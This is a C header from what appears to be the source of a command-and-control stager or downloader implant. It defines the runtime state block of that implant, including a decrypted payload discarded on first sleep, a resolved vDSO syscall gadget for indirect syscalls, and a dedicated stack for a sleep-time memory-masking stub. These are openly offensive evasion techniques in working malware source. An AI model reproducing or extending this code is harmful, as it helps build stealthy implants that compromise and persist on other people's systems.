#ifndef STAGER_STATE_H
#define STAGER_STATE_H

/*
 * Runtime state for the freestanding stager.
 *
 * The stager image is mapped RX (W^X): the self-unpacker maps the payload
 * read/write, then flips it to read/execute before jumping. Because the image
 * cannot be written once it is running, mutable globals cannot live in .data.
 *
 * Instead, downloader_main() calls stager_state_init() once, before any
 * syscall. That mmaps a dedicated read/write page for the single mutable
 * state block and installs its address as the GS base. get_stager_state()
 * reads the self pointer at %gs:0, so any compiler can address the block
 * without reserving a general-purpose register (clang has no -ffixed-r15).
 */

#include "stager_iface.h"
#include "util/dynload.h"

/* Dedicated stack for the mask stub, plus space for its local ranges/maps
 * arrays and /proc/self/maps buffer. The whole mapping (state page + this
 * stack) is excluded from masking. */
#define STAGER_MASK_STACK_SIZE (64u * 1024u)

struct stager_state {
  /* Published same-process ABI; self must stay at %gs:0 (see below). */
  struct c2_stager_public pub;
  void *payload;      /* decrypted payload blob, discarded on first sleep */
  size_t payload_size;
  void *syscall_gadget; /* resolved vDSO `syscall; ret` gadget */
  dynload dl;           /* runtime dlopen/dlsym/dlclose cache */
  void *mask_stack_top; /* high address of the stable mask stack */
  size_t state_map_len; /* length of the whole state+stack mapping */
};

/* Sentinel value for syscall_gadget before init_indirect_syscalls(). */
#define _SYSCALL_GADGET_UNRESOLVED ((void *)1)

/* Read the state block installed as the GS base by stager_state_init().
 * %gs:0 is the block's self pointer, so no general-purpose register is
 * reserved and every translation unit gets the same stable address. */
static inline struct stager_state *get_stager_state(void) {
  struct stager_state *st;
  __asm__ __volatile__("movq %%gs:0, %0" : "=r"(st));
  return st;
}

/* dynload context backed by the state block; transports use this instead of a
 * writable global. */
static inline dynload *stager_dynload(void) { return &get_stager_state()->dl; }

/* mmap a dedicated RW state page, initialise it, and install it as the GS
 * base. Must be called once at the top of downloader_main, before any
 * syscall. */
void stager_state_init(void);

#endif /* STAGER_STATE_H */
